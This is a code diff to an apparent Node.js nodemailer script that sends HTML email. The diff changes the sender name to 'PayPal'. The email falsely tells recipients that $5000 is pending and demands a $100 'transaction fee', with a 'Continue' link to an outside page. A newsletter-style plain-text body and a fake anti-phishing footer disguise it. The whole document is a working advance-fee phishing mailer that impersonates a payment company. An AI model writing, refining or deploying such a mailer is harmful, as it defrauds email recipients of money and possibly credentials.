@@ -41,7 +41,7 @@ const transporter = nodemailer.createTransport({
 
   // Email options
   const mailOptions = {
-    from: `"Ricky" <${process.env.EMAIL_USER}>`,
+    from: `"PayPal" <${process.env.EMAIL_USER}>`,
     to: to, // Recipient email from frontend
     subject: 'A transaction is pending and been reviewed (Ref ID - TY-U-753194873157)',
     text: `Welcome to Our Newsletter. ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://example.com`,
@@ -51,7 +51,7 @@ const transporter = nodemailer.createTransport({
     <img src="https://michyqruz.github.io/The-money-box/IMG_8578.jpeg" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
     <h1 style="color: #000000; font-size: 36px; margin: 40px 0; font-weight: 900;">$5000 PENDING TRANSACTION</h1>
     <p style="color: #000000; font-size: 20px; font-weight: bold; text-align: left; line-height: 1.5;">
-        You just receieved WUI-XY9IRY68LZ $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
+        You just receieved $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
     </p>
     <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #000000; color: white; text-decoration: none; border-radius: 25px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
   </div>
@@ -61,10 +61,10 @@ const transporter = nodemailer.createTransport({
               <img src="https://michyqruz.github.io/The-money-box/IMG_8578.jpeg" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
               <hr style="margin: 30px auto; border: 1px solid #D3D3D3;">
           </div>
-          <div style="text-align: center; display: flex; justify-content: center;">
-              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px;">Reliable</p>
-              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Secure</p>
-              <p style="font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Easy</p>
+          <div style="text-align: center;">
+              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px;">Reliable</p>
+              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Secure</p>
+              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Easy</p>
           </div>
           <p style="color: #555; font-size: 14px;">
      We are committed to preventing fraudulent emails. Emails from us will always contain your full name. <span style="font-size: 12px; color: #1a73e8;">Learn to identify phishing</span>
